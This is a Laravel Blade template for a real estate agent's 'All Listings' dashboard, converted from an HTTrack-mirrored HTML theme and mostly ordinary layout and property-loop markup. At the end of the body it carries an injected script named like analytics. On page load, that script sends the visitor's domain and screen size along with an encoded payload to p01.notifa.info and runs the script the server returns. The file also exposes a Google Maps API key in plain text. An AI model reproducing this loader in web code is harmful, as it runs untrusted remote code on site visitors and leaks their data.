<!DOCTYPE html>
<html lang="en">
  
<!-- Mirrored from eorrangeshop.com/html/divinevillas/dashboard-all-listing.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 21 Feb 2019 04:12:47 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Divine Villas - Real Estate HTML Template</title>

    <!-- Bootstrap -->
    <link href="{{asset('assets/css/bootstrap.min.css')}}" rel="stylesheet">
    
    <!-- External Css -->
    <link rel="stylesheet" href="{{asset('assets/css/fontawesome-all.min.css')}}">
    <link rel="stylesheet" href="{{asset('assets/css/themify-icons.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/et-line.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/owl.carousel.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/jquery.nstSlider.min.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/bootstrap-select.min.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/plyr.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/magnific-popup.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/js-flickr-gallery.css')}}" />

    <!-- leaflet -->
    <link rel="stylesheet" href="{{asset('assets/leaflet/css/leaflet.css')}}">
    <link rel="stylesheet" href="{{asset('assets/leaflet/css/MarkerCluster.css')}}">
    <link rel="stylesheet" href="{{asset('assets/leaflet/css/MarkerCluster.Default.css')}}">

    <!-- Custom Css -->
    <link rel="stylesheet" type="text/css" href="{{asset('css/main.css')}}">

    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700" rel="stylesheet">

    <!-- Favicon -->
    <link rel="icon" href="{{asset('images/favicon.png')}}">
    <link rel="apple-touch-icon" href="{{asset('images/apple-touch-icon.png')}}">
    <link rel="apple-touch-icon" sizes="72x72" href="{{asset('images/icon-72x72.png')}}">
    <link rel="apple-touch-icon" sizes="114x114" href="{{asset('images/icon-114x114.png')}}">

    <!--[if lt IE 9]>
    <script src="{{asset('assets/js/html5shiv.min.js')}}"></script>
    <script src="{{asset('assets/js/respond.min.js')}}"></script>
    <![endif]-->

  </head>
  <body>
    
    @include('layouts.nav')
    
    <!-- Dashboard -->
    <div class="cp-container section-padding">
      <div class="container-fluid">
        <div class="row">
          <div class="col-md-3">
            <div class="user-profile">
              <div class="user-thumb">
                <img src="{{asset('images/dashboard/user/thumb-1.jpg')}}" class="img-responsive" alt="">
                <div class="varified">
                  <i class="fas fa-check"></i>
                </div>
              </div>
              <div class="user-name">
                <h5><a href="#">Maria K.Marlin</a></h5>
              </div>
              <div class="info">
                <div class="profile-info">
                  <h6>85%</h6>
                  <p>Profile comp</p>
                  <a href="#" class="button primary-bg">Edit Profile</a>
                </div>
                <div class="notification">
                  <h6>35</h6>
                  <p>Notification</p>
                  <a href="#" class="button primary-bg">Log Out</a>
                </div>
              </div>
            </div>
            <div class="dashboard-sidenav">
              <ul class="dashboard-nav" id="dashboard-nav">
                <li class="navigation-item">
                  <a href="dashboard.html"><span class="ti-layers-alt"></span>Dashboard</a>
                </li>
                <li class="navigation-item dropdown">
                  <a href="#"><span class="ti-location-pin"></span>My Listing</a>
                  <ul class="dropdown-menu">
                    <li><a href="dashboard-all-listing.html">All Listings</a></li>
                    <li><a href="dashboard-add-listing.html">Add New Listings</a></li>
                    <li><a href="dashboard-active-listing.html">Active Listings</a></li>
                    <li><a href="dashboard-expired-listing.html">Expired Listings</a></li>
                  </ul>
                </li>
                <li class="navigation-item">
                  <a href="dashboard-my-favorites.html"><span class="ti-heart"></span>My Favorites</a>
                </li>
                <li class="navigation-item dropdown">
                  <a href="#"><span class="ti-comment-alt"></span>Reviews<span class="badge">(05)</span></a>
                  <ul class="dropdown-menu">
                    <li><a href="dashboard-all-review.html">All Reviews</a></li>
                    <li><a href="dashboard-my-review.html">My Reviews</a></li>
                  </ul>
                </li>
                <li class="navigation-item dropdown">
                  <a href="#"><span class="ti-email"></span>Messages<span class="badge">(12)</span></a>
                  <ul class="dropdown-menu">
                    <li><a href="dashboard-all-message.html">All Messages</a></li>
                    <li><a href="dashboard-unread-message.html">Unread Messages</a></li>
                  </ul>
                </li>
                <li class="navigation-item dropdown">
                  <a href="#"><span class="ti-gift"></span>Packages</a>
                  <ul class="dropdown-menu">
                    <li><a href="dashboard-checkout.html">Check Out</a></li>
                    <li><a href="dashboard-package-plan.html">Package Plan</a></li>
                  </ul>
                </li>
                <li class="navigation-item">
                  <a href="dashboard-invoices.html"><span class="ti-clipboard"></span>Invoice</a>
                </li>
                <li class="navigation-item">
                  <a href="dashboard-claim-refund.html"><span class="ti-widget-alt"></span>Claim &amp; Refund</a>
                </li>
                <li class="navigation-item">
                  <a href="dashboard-settings.html"><span class="ti-settings"></span>Setting</a>
                </li>
                <li class="navigation-item">
                  <a href="dashboard-my-profile.html"><span class="ti-user"></span>My Profile</a>
                </li>
              </ul>
            </div>
          </div>
          <div class="col-md-6 margin-balance">
            <div class="dashboard-body-block">
              <div class="all-listing">
                <div class="row">

                  @foreach ($properties as $property)
                                            
                  

                  <div class="col-lg-6 col-md-12 col-sm-6">
                    <div class="listing">
                      <div class="listing-thumb">
                        <div class="listing-slider">

                          @foreach ($property->images as $image)    
                          <div class="slide" style="height: 300px; overflow:hidden">
                            <img src="{{asset($image->photo)}}" class="img-responsive" style="width: 100%; height: 100%; object-fit:cover" alt="">
                          </div>
                          @endforeach

                        </div>
                        <div class="overlay"></div>
                        <div class="rate">
                        <span>{{$property->price}} {{$property->value}}</span>
                        </div>
                      </div>
                      <div class="content-block">
                        <div class="listing-body">
                        <h5><a href="/agent/properties/{{$property->id}}">{{$property->title}}</a> <span class="badge sale">{{$property->status->name}}</span></h5>
                          <div class="meta">
                            <span class="listing-type">{{$property->type->name}}</span>
                          <span class="listing-status open">{{$property->user->name}}</span>
                          </div>
                        <span class="address"><i class="fas fa-map-marker-alt"></i>{{$property->location}}</span>
                          <div class="info">
                            <div class="listing-info bedroom">
                              <span class="title">Kamar Tidur</span>
                              <span class="number">{{$property->bedroom}}</span>
                            </div>
                            <div class="listing-info bath">
                              <span class="title">Kamar Mandi</span>
                            <span class="number">{{$property->bathroom}}</span>
                            </div>
                            <div class="listing-info size">
                              <span class="title">Luas (m<sup>2</sup>)</span>
                            <span class="number">{{$property->building_area}}</span>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  @endforeach

                </div>
              </div>
            </div>
          </div>
          <div class="col-md-3">
            <div class="dashboard-activity-container">
              <h5 class="activity-title">Notification</h5>
              <ul class="activity-wrapper">
                <li class="activity-list">
                  <p class="time">10 Minutes ago</p>
                  <p class="title"><a href="#">Roman Write a Review</a></p>
                </li>
                <li class="activity-list">
                  <p class="time">10 Minutes ago</p>
                  <p class="title"><a href="#">New Message</a></p>
                </li>
                <li class="activity-list">
                  <p class="time">10 Minutes ago</p>
                  <p class="title"><a href="#">New Comment</a></p>
                </li>
                <li class="activity-list">
                  <p class="time">10 Minutes ago</p>
                  <p class="title"><a href="#">New Listing Added</a></p>
                </li>
                <li class="activity-list">
                  <p class="time">10 Minutes ago</p>
                  <p class="title"><a href="#">Found New Place</a></p>
                </li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </div>
    <!-- Dashboard End -->

    <!-- Call to Action -->
    <div class="cpdv-container primary-bg section-padding-50">
      <div class="container">
        <div class="row">
          <div class="col-lg-7 col-md-6">
            <div class="left-content">
              <div class="call-to-action-content">
                <h3>Subscribe Today!</h3>
                <p>Don’t miss our future updates. Get Subscribe today to getting Updates!</p>
              </div>
            </div>
          </div>
          <div class="col-lg-5 col-md-6">
            <div class="right-content-sm">
              <div class="call-to-action-form">
                <form class="subscription-form" action="#" method="post">
                  <input type="text" placeholder="Enter your mail here">
                  <button class="button white-bg">Subscribe</button>
				  <p class="newsletter-success"></p>
				  <p class="newsletter-error"></p>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <!-- Call to Action End -->

    <!-- Footer -->
    <footer>
      <div class="footer-widget-area section-padding">
        <div class="container">
          <div class="row margin-balance">
            <div class="col-md-3 col-sm-6">
              <aside class="widget footer-get-in-touch-widget">
                <h6 class="widget-title">Get in Touch</h6>
                <p><span class="title">Address</span><span class="contact-info">180 Madison Squre <br> New York, NY123545</span></p>
                <p><span class="title">Phone</span><span class="contact-info">+1-254-2564-235</span></p>
                <p><span class="title">Email</span><span class="contact-info">mail@example.com</span></p>
              </aside>
            </div>
            <div class="col-md-3 col-sm-6">
              <aside class="widget footer-listing-widget">
                <h6 class="widget-title">Latest Listings</h6>
                <div class="footer-listings">
                  <div class="footer-listing">
                    <div class="listing-thumb">
                      <a href="#">
                        <img src="{{asset('images/listing/footer-listing-1.jpg')}}" class="img-responsive" alt="">
                      </a>
                    </div>
                    <div class="body">
                      <p class="title"><a href="#">Hotel in Madison Square</a></p>
                      <p class="cost">$1255.00 / Months</p>
                    </div>
                  </div>
                  <div class="footer-listing">
                    <div class="listing-thumb">
                      <a href="#">
                        <img src="{{asset('images/listing/footer-listing-1.jpg')}}" class="img-responsive" alt="">
                      </a>
                    </div>
                    <div class="body">
                      <p class="title"><a href="#">Hotel in Madison Square</a></p>
                      <p class="cost">$1255.00 / Months</p>
                    </div>
                  </div>
                </div>
              </aside>
            </div>
            <div class="col-md-2 col-sm-4">
              <aside class="widget widget-useful-link">
                <h6 class="widget-title">Useful Links</h6>
                <ul class="links">
                  <li><a href="#">About Us</a></li>
                  <li><a href="#">Recent Listings</a></li>
                  <li><a href="#">Featured Listings</a></li>
                  <li><a href="#">Our Service</a></li>
                </ul>
              </aside>
            </div>
            <div class="col-md-2 col-sm-4">
              <aside class="widget widget-useful-link">
                <h6 class="widget-title">Buy Information</h6>
                <ul class="links">
                  <li><a href="#">How to Purchase</a></li>
                  <li><a href="#">Tips &amp; Tricks</a></li>
                  <li><a href="#">Privacy Policy</a></li>
                  <li><a href="#">Legal / Law</a></li>
                </ul>
              </aside>
            </div>
            <div class="col-md-2 col-sm-4">
              <aside class="widget widget-useful-link">
                <h6 class="widget-title">Sell Information</h6>
                <ul class="links">
                  <li><a href="#">How to Purchase</a></li>
                  <li><a href="#">Tips &amp; Tricks</a></li>
                  <li><a href="#">Privacy Policy</a></li>
                  <li><a href="#">Legal / Law</a></li>
                </ul>
              </aside>
            </div>
          </div>
        </div>
      </div>
      <div class="grey-bg section-padding-50">
        <div class="container">
          <div class="row">
            <div class="col-md-4 col-md-offset-4">
              <div class="footer-social-link">
                <div class="footer-logo">
                  <a href="#">
                    <img src="{{asset('images/footer-logo.svg')}}" class="img-responsive" alt="Footer Logo">
                  </a>
                </div>
                <div class="social-link">
                  <ul>
                    <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
                    <li><a href="#"><i class="fab fa-twitter"></i></a></li>
                    <li><a href="#"><i class="fab fa-google-plus-g"></i></a></li>
                    <li><a href="#"><i class="fab fa-linkedin-in"></i></a></li>
                    <li><a href="#"><i class="fab fa-youtube"></i></a></li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="copyright primary-bg">
        <div class="container">
          <div class="row">
            <div class="col-md-6 col-md-push-6">
              <div class="footer-nav" id="footer-nav">
                <ul>
                  <li class="submenu">
                    <a href="#">Legal</a>
                    <ul class="submenu-item">
                      <li><a href="#">Dropdown 1</a></li>
                      <li><a href="#">Dropdown 2</a></li>
                      <li><a href="#">Dropdown 3</a></li>
                      <li class="submenu">
                        <a href="#">Dropdown 4</a>
                        <ul class="submenu-item">
                          <li><a href="#">Dropdown 1</a></li>
                          <li><a href="#">Dropdown 2</a></li>
                          <li><a href="#">Dropdown 3</a></li>
                          <li class="submenu">
                            <a href="#">Dropdown 4</a>
                            <ul class="submenu-item">
                              <li><a href="#">Dropdown 1</a></li>
                              <li><a href="#">Dropdown 2</a></li>
                              <li><a href="#">Dropdown 3</a></li>
                              <li class="submenu">
                                <a href="#">Dropdown 4</a>
                                <ul class="submenu-item">
                                  <li><a href="#">Dropdown 1</a></li>
                                  <li><a href="#">Dropdown 2</a></li>
                                  <li><a href="#">Dropdown 3</a></li>
                                  <li class="submenu">
                                    <a href="#">Dropdown 4</a>
                                    <ul class="submenu-item">
                                      <li><a href="#">Dropdown 1</a></li>
                                      <li><a href="#">Dropdown 2</a></li>
                                      <li><a href="#">Dropdown 3</a></li>
                                    </ul>
                                  </li>
                                </ul>
                              </li>
                            </ul>
                          </li>
                        </ul>
                      </li>
                    </ul>
                  </li>
                  <li><a href="#">Terms &amp; Conditions </a></li>
                  <li><a href="#">Legal</a></li>
                  <li><a href="#">Privacy Policy</a></li>
                </ul>
              </div>
            </div>
            <div class="col-md-6 col-md-pull-6">
              <p class="copyright-text">Copyright 2018, <a href="#">Real Estate</a>. All Rights Reserved</p>
            </div>
          </div>
        </div>
      </div>
    </footer>
    <!-- Footer End -->




    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="{{asset('assets/js/jquery.min.js')}}"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="{{asset('assets/js/bootstrap.min.js')}}"></script>
    <script src="{{asset('assets/js/visible.js')}}"></script>
    <script src="{{asset('assets/js/owl.carousel.min.js')}}"></script>
    <script src="{{asset('assets/js/jquery.nstSlider.min.js')}}"></script>
    <script src="{{asset('assets/js/bootstrap-select.min.js')}}"></script>
    <script src="{{asset('assets/js/plyr.js')}}"></script>
    <script src="{{asset('assets/js/jquery-migrate-3.0.1.js')}}"></script>
    <script src="{{asset('assets/js/jquery.magnific-popup.min.js')}}"></script>
    <script src="{{asset('assets/js/js-flickr-gallery.js')}}"></script>
    <script src="{{asset('assets/js/tinymce.min.js')}}"></script>
    <script src="{{asset('assets/js/isotope.pkgd.min.js')}}"></script>
    <script src="{{asset('assets/js/imagesloaded.pkgd.min.js')}}"></script>
    <script src="{{asset('assets/js/jquery.ajaxchimp.min.js')}}"></script>

    <!-- leaflet -->
    <script src="{{asset('assets/leaflet/js/dummylatlng.js')}}"></script>
    <script src="{{asset('assets/leaflet/js/leaflet-src.js')}}"></script>
    <script src="{{asset('assets/leaflet/js/leaflet.markercluster-src.js')}}"></script>

    <script src="{{asset('js/custom.js')}}"></script>
    <script src="{{asset('js/dashboard.js')}}"></script>
    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAmiJjq5DIg_K9fv6RE72OY__p9jz0YTMI"></script>
    <script src="{{asset('js/map.js')}}"></script>
    <script src="{{asset('js/searchMap.js')}}"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH21UyEHQgB6pJDmtm%2bxesmo0ZMegSCb3JUanBtEhdW961ElByTx5MQ7%2fU%2bOg4Fax2kO31n84DP%2fSTsLMgvIn3nLbHhFfmJSOYL0y87kzBB65nkxrkPX9h8TMwxWZbjB0M1nJ8WzSHL%2b6lBfZ9fu5vSJRt02cACRflXTaMdV54%2fV0Pr3T2IdZoluJzo%2bKL%2boyrgs2%2boVAeh5WYOEI1xe%2fnum%2b%2fVLwdWk6Vevxl7gT%2bTZRv4IjosRlBtGaRYxSFc9d8Eezgd3TSe2zKcKrpF%2fYp7de91TlvmmUPW5qAOB2c7rKjO4KcTVpuKwhS2QD9cyVC8yV%2fIbCSy81M7uHYzSKNqZT%2fYLfzOK6U9WrBfk2zCTzoOqaTDiT2uyt%2fdrWd9AX40pmzLJQPcsXDtVlVWkT6NMS1DbNnjKY063sLI3SzDWTRrxZZ%2fTL5cJ3CG50nVnzfOTVx2wyqSjHuWlIc6iRKXn4ONdsKF%2bh0ukefNbDintf6daoQGontKVeTXTq%2bDkqvUg7%2f%2fsHUJ0%2bU%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from eorrangeshop.com/html/divinevillas/dashboard-all-listing.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 21 Feb 2019 04:12:48 GMT -->
</html>